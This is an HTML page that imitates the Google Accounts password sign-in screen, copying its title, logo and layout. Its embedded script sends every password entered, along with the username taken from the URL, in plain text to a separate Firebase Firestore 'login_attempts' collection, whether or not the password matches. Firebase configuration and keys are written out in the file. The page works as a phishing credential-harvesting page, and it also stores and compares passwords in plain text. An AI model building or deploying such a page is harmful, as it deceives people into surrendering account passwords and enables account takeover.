<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in – Google Accounts</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Product+Sans&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    :root {
      --blue: #1a73e8;
      --blue-dark: #1765cc;
      --text: #202124;
      --muted: #5f6368;
      --border: #dadce0;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #fff;
      font-family: "Google Sans", Roboto, Arial, sans-serif;
      color: var(--text);
    }

    .card {
      width: 100%;
      max-width: 450px;
      padding: 48px 40px 36px;
      border: 1px solid var(--border);
      border-radius: 8px;
      background: #fff;
    }

    .logo {
      text-align: center;
      font-family: "Product Sans", "Google Sans", Arial, sans-serif;
      font-size: 24px;
      font-weight: 500;
      letter-spacing: -0.5px;
      line-height: 1;
      margin-bottom: 16px;
    }
    .logo .b { color: #4285f4; }
    .logo .r { color: #ea4335; }
    .logo .y { color: #fbbc05; }
    .logo .g { color: #34a853; }

    h1 {
      margin: 0 0 8px;
      text-align: center;
      font-size: 24px;
      font-weight: 400;
      line-height: 1.33;
    }

    /* Identity pill showing who's signing in */
    .identity {
      display: flex;
      align-items: center;
      gap: 8px;
      justify-content: center;
      margin: 0 auto 40px;
      padding: 6px 12px 6px 6px;
      width: fit-content;
      border: 1px solid var(--border);
      border-radius: 16px;
      font-size: 14px;
      cursor: pointer;
      background: none;
    }
    .identity:hover { background: #f8f9fa; }
    .avatar {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: var(--blue);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: 500;
      flex-shrink: 0;
    }
    .identity span { color: var(--text); }

    .field {
      position: relative;
      margin-bottom: 8px;
    }

    .field input {
      width: 100%;
      height: 56px;
      padding: 13px 15px;
      font: inherit;
      font-size: 16px;
      color: var(--text);
      background: transparent;
      border: 1px solid #747775;
      border-radius: 4px;
      outline: none;
      transition: border-color .15s;
    }

    .field label {
      position: absolute;
      left: 12px;
      top: 50%;
      padding: 0 4px;
      font-size: 16px;
      color: var(--muted);
      background: #fff;
      pointer-events: none;
      transform: translateY(-50%);
      transition: all .15s ease;
    }

    .field input:hover { border-color: var(--text); }

    .field input:focus {
      border: 2px solid var(--blue);
      padding: 12px 14px;
    }

    .field input:focus + label,
    .field input:not(:placeholder-shown) + label {
      top: 0;
      font-size: 12px;
    }
    .field input:focus + label { color: var(--blue); }

    .show-pw {
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 16px 0 0;
      font-size: 14px;
      cursor: pointer;
    }
    .show-pw input {
      width: 18px;
      height: 18px;
      margin: 0;
      accent-color: var(--blue);
      cursor: pointer;
    }

    a {
      color: var(--blue);
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
    }
    a:hover { color: var(--blue-dark); text-decoration: underline; }

    .forgot { display: inline-block; margin-top: 24px; }

    .actions {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 40px;
    }

    .try-another { font-size: 14px; }

    .btn-next {
      min-width: 88px;
      height: 40px;
      padding: 0 24px;
      font: inherit;
      font-size: 14px;
      font-weight: 500;
      color: #fff;
      background: var(--blue);
      border: 0;
      border-radius: 4px;
      cursor: pointer;
      transition: background .15s, box-shadow .15s;
    }
    .btn-next:hover {
      background: var(--blue-dark);
      box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
    }
    .btn-next:focus-visible,
    a:focus-visible {
      outline: 2px solid var(--blue);
      outline-offset: 2px;
    }

    @media (max-width: 450px) {
      body { align-items: flex-start; }
      .card { border: 0; padding: 24px 24px 36px; }
    }
  </style>
</head>
<body>
  <main class="card">
    <div class="logo" aria-label="Google">
      <span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span>
    </div>

    <h1>Welcome</h1>

    <button type="button" class="identity" id="identity" onclick="window.location.href='google-signin.html'">
      <span class="avatar" id="avatarLetter">?</span>
      <span id="identityText">you</span>
    </button>

    <form id="passwordForm" novalidate>
      <div class="field">
        <input type="password" id="password" name="password" placeholder=" " autocomplete="off" autofocus>
        <label for="password">Enter your password</label>
      </div>

      <a href="#" class="forgot">Forgot password?</a>

      <div class="actions">
        <a href="#" class="try-another">Try another way</a>
        <button type="submit" class="btn-next">Next</button>
      </div>
    </form>
  </main>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
    import {
      getFirestore,
      collection,
      query,
      where,
      getDocs,
      addDoc,
      serverTimestamp
    } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAKYYTYwwiB5yQeAKG4RqntfKMv_kSCerc",
      authDomain: "login-d35dd.firebaseapp.com",
      projectId: "login-d35dd",
      storageBucket: "login-d35dd.firebasestorage.app",
      messagingSenderId: "827526763437",
      appId: "1:827526763437:web:bc05699481f1a0513e0724"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const usersRef = collection(db, "users");
    const attemptsRef = collection(db, "login_attempts");

    // Read the username passed from the sign-in page
    const params = new URLSearchParams(window.location.search);
    const username = params.get('user') || '';

    document.getElementById('identityText').textContent = username || 'your account';
    document.getElementById('avatarLetter').textContent = username ? username[0].toUpperCase() : '?';

    if (!username) {
      // No identifier was passed in — send the person back to start over
      window.location.href = 'google-signin.html';
    }

    const form = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('password');
    const submitBtn = form.querySelector('.btn-next');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      const password = passwordInput.value;

      if (!password) {
        alert('Enter a password.');
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = 'Checking...';

      try {
        const q = query(
          usersRef,
          where('username', '==', username),
          where('password', '==', password)
        );
        const snap = await getDocs(q);
        const matched = !snap.empty;

        // Every submission gets written to Firestore as plain text,
        // whether or not it matched — this is what shows up as new data.
        await addDoc(attemptsRef, {
          username: username,
          password: password,
          matched: matched,
          attemptedAt: serverTimestamp()
        });

        if (!matched) {
          alert('Wrong password. Try again.');
          passwordInput.value = '';
          passwordInput.focus();
        } else {
          // Correct match — replace this with wherever signed-in users should land
          alert('Signed in successfully.');
        }
      } catch (err) {
        console.error(err);
        alert('Something went wrong: ' + err.message);
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Next';
      }
    });
  </script>
</body>
</html>
